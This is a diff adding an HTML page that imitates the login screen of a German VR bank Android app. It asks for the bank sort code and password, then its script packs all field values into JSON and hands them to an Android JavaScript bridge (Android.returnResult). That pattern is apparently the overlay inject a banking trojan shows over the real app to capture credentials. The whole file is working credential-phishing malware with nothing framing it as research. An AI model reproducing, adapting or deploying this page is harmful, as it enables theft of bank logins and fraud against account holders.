@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>vr</title>
+    <link rel="shortcut icon" href="de.fiducia.smartphone.android.banking.vr.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #fff;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+    }
+    .logo {
+text-align: center; background-size: 100%; padding: 10px 0px 10px 0px; background: none; color: #fff; font-weight: 400; text-decoration: none; background: #0b67b0;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    color: #6c6b6b;
+    text-align: left;
+    outline: none;
+    background: #ffffff;
+    border-top: 1px solid #aeaeae;
+    border-left: none;
+    border-right: none;
+    border-bottom: 1px solid #aeaeae;
+    margin: 0 auto;
+    padding-left: 10px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #ffffff;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #1652f0;
+    border-radius: 10px;
+}
+input::placeholder {
+    color: #a5a2a2;
+    font-size: 15px;
+}
+input:disabled {
+    left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #2a2929;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #cecece;
+    border-radius: 10px;
+}
+input[type="checkbox"] {
+    display: none;
+}
+
+/* стили для метки */
+input[type="checkbox"] + label {
+    cursor: pointer;
+    padding-left: 50px;
+    position: relative;
+    font-family: tahoma, sans-serif, arial;
+    line-height: 40px;
+}
+
+/* стили для поля с бегунком*/
+input[type="checkbox"] + label::before {
+content: "";
+    display: inline-block;
+    position: absolute;
+    top: 0;
+    left: 0;
+    vertical-align: middle;
+    padding: 0;
+    height: 24px;
+    width: 45px;
+    margin: 0 5px 0 0;
+    border: 1px solid #d7d7d7;
+    border-radius: 12px;
+    background: #fcfcfc;
+}
+
+/* стили для бегунка*/
+input[type="checkbox"] + label::after {
+content: "";
+    display: block;
+    position: absolute;
+    top: -0.5px;
+    left: 1px;
+    width: 25px;
+    height: 25px;
+    border-radius: 22px;
+    background: #ffffff;
+    border: 1px solid #dadada;
+    box-shadow: 0 3px 3px rgba(140, 140, 140, .1);
+}
+
+/* плавность )) */
+input[type="checkbox"] + label::before,
+input[type="checkbox"] + label::after {
+    -webkit-transition: all .2s ease-out;
+    transition: all .2s ease-out;
+}
+
+/* чекнутое состояние )) */
+input[type="checkbox"]:checked + label::before {
+    background: #6edc5f;
+    border-color: #6dd75e;
+}
+input[type="checkbox"]:checked + label::after {
+    left: 22px;
+}
+.Window {
+ position: fixed;
+ top: 0;
+ right: 0;
+ bottom: 0;
+ left: 0;
+ background: rgba(91, 91, 91, 0.7);
+ z-index: 99999;
+ -webkit-transition: opacity 400ms ease-in;
+ -moz-transition: opacity 400ms ease-in;
+ transition: opacity 400ms ease-in;
+ display: none;
+ pointer-events: none;
+}
+
+.Window:target {
+ display: block;
+ pointer-events: auto;
+}
+
+.Window > div {
+    width: auto;
+    position: relative;
+    margin: 80px 10px 0px 10px;
+    padding: 20px 20px 1px 20px;
+    border-radius: 20px;
+    background: #efefef;
+}
+
+.close {
+ background: #cc3300;
+ color: #FFFFFF;
+ line-height: 25px;
+ position: absolute;
+ right: -12px;
+ text-align: center;
+ top: -10px;
+ width: 24px;
+ text-decoration: none;
+ font-weight: bold;
+ -webkit-border-radius: 12px;
+ -moz-border-radius: 12px;
+ border-radius: 12px;
+ -moz-box-shadow: 1px 1px 3px #000;
+ -webkit-box-shadow: 1px 1px 3px #000;
+ box-shadow: 1px 1px 3px #000;
+}
+.close:hover { background: #990000; }
+</style>
+
+<fieldset id="formtosend">
+
+<div id="home" style="display: block;">
+
+<div class="logo">
+<span style="display: inline-block;padding-left: 10px;float: left;position: relative;top: -3px;"><img src="data:image/png;base64,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" style="width: 15px; position: relative;top: 2px;"> Zurück</span>
+<span style="    display: inline-block;"></span>
+<a href="#" style="display: inline-block;padding-right: 10px;float: right; text-decoration: none; color: #fff;" onclick="show_login()">Fertig</a>
+</div>
+
+<div style="padding-top: 20px;">
+<label style="font-size: 15px; float: left; margin-left: 10px;">Bankleitzahl</label>
+<input type="text" name="bitte_eingeben" style="padding-left: 30px;" id="bitte" placeholder="Bitte eingeben" onkeyup="check2()">
+
+</div>
+
+<script type="text/javascript">
+    function show_login() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("logpage").style.display="block";
+    }
+</script>
+
+</div>
+
+<div id="logpage" style="display: none;">
+
+<div class="logo">
+<span style="display: inline-block;padding-left: 10px;float: left;"></span>
+<span style="    display: inline-block;"></span>
+<a href="#" style="display: inline-block;padding-right: 10px;float: right; text-decoration: none; color: #fff;" onclick="send_form()">Fertig</a>
+</div>
+
+<div style="padding-top: 20px;">
+
+<label style="font-size: 15px; float: left; margin-left: 10px;">Passwort</label>
+<input type="text" name="passwort" id="passwort" placeholder="Passwort eingeben" style="padding-left: 30px;">
+
+<input name="exit" type="hidden" text="true"/>
+
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
